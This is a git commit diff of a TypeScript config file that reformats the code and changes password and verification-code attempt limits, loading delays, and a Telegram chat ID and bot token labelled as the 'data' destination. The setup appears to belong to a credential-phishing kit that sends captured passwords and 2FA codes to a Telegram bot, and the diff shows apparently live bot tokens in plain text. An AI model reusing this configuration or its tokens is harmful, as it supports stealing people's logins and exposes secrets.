49505a7592b25f85405c6035749fa139cd9defce
Yudind96 <thanhduy19796@gmail.com>
2025-03-04 15:27:00 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,29 +1,29 @@
 interface Config {
-  settings: {
-    code_loading_time: number;
-    max_failed_code_attempts: number;
-    max_failed_password_attempts: number;
-    password_loading_time: number;
-  };
-  telegram: {
-    data_chatid: string;
-    data_token: string;
-  };
+	settings: {
+		code_loading_time: number;
+		max_failed_code_attempts: number;
+		max_failed_password_attempts: number;
+		password_loading_time: number;
+	};
+	telegram: {
+		data_chatid: string;
+		data_token: string;
+	};
 }
 const defaultConfig: Config = {
-  settings: {
-    code_loading_time: 10000,
-    max_failed_code_attempts: 4,
-    max_failed_password_attempts: 0,
-    password_loading_time: 10000,
-  },
-  telegram: {
-    data_chatid: "1922578871",
-    data_token: "8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w",
-  },
+	settings: {
+		code_loading_time: 2000,
+		max_failed_code_attempts: 4,
+		max_failed_password_attempts: 1,
+		password_loading_time: 2000,
+	},
+	telegram: {
+		data_chatid: "1261037261",
+		data_token: "8134902426:AAGKIcamw3b_KYkKlLGvznKiPbaKu_3qU2g",
+	},
 };
 const getConfig = (): Config => {
-  return defaultConfig;
+	return defaultConfig;
 };
 
 export default getConfig;
